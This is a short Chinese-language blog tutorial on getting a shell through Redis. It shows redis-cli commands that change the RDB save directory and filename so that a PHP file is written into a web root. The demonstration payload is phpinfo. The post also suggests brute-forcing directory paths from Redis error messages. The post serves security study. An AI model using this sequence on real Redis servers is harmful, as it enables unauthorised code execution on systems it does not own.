---
title: "Redis Getshell"
date: 2018-03-05T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['redis']
categories: ['Web安全']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

本质上是 redis RDB 方式指定保存数据库的路径.

<!--more-->

## 介绍

redis 配置里有 dir 和 dbfilename

dir 存储路径 dbfilename 存储文件名

```
127.0.0.1:6379> config get dir
1) "dir"
2) "F:\Redis"
127.0.0.1:6379> config get dbfilename
1) "dbfilename"
2) "dump.rdb"
```

save 保存

## 利用

`config set dir 路径`

`config dbfilename 文件名`

`set web 内容`

`save`

```
127.0.0.1:6379> config set dir F:\phpStudy\WWW
OK
127.0.0.1:6379> config set dbfilename 'info.php'
OK
127.0.0.1:6379> set web '<?php phpinfo() ?>'
OK
```

另外 config set 不存在的 dir 会报错.

```
127.0.0.1:6379> config set dir F:\fakepath
(error) ERR Changing directory: No such file or directory
```

可以写脚本爆破路径